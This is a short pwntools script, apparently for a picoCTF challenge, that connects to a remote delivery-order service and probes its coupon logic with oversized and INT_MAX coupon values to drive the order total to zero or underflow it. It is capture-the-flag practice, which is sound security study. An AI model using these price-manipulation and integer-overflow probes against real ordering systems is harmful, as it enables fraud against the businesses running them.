#!/usr/bin/env python3
"""Try the coupon = hops trick to make total = 0 (free delivery)."""
from pwn import *
import sys, io, time, re
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

context.log_level = "error"

def session():
    r = remote("mysterious-sea.picoctf.net", 59623)
    r.recv(timeout=2)
    return r

def cmd(r, c, wait=0.3):
    r.sendline(c.encode() if isinstance(c, str) else c)
    time.sleep(wait)
    try:
        return r.recv(timeout=1.5).decode(errors="replace")
    except EOFError:
        return "[EOF]"

# Test: coupon = hops
print("=" * 60)
print("TEST: coupon = hops (14)")
print("=" * 60)
r = session()
print(cmd(r, "load city1.map"))
print(cmd(r, "add_order 5 5"))
print(cmd(r, "coupon 0 14"))
print(cmd(r, "receipt 0"))
print(cmd(r, "dispatch 0", wait=4))
r.close()

# Try larger coupon to underflow
print("\n" + "=" * 60)
print("TEST: huge coupon > hops")
print("=" * 60)
r = session()
print(cmd(r, "load city1.map"))
print(cmd(r, "add_order 5 5"))
print(cmd(r, "coupon 0 100"))
print(cmd(r, "receipt 0"))
print(cmd(r, "dispatch 0", wait=4))
r.close()

# Try INT_MAX
print("\n" + "=" * 60)
print("TEST: INT_MAX coupon")
print("=" * 60)
r = session()
print(cmd(r, "load city1.map"))
print(cmd(r, "add_order 5 5"))
print(cmd(r, "coupon 0 2147483647"))
print(cmd(r, "receipt 0"))
print(cmd(r, "dispatch 0", wait=4))
r.close()
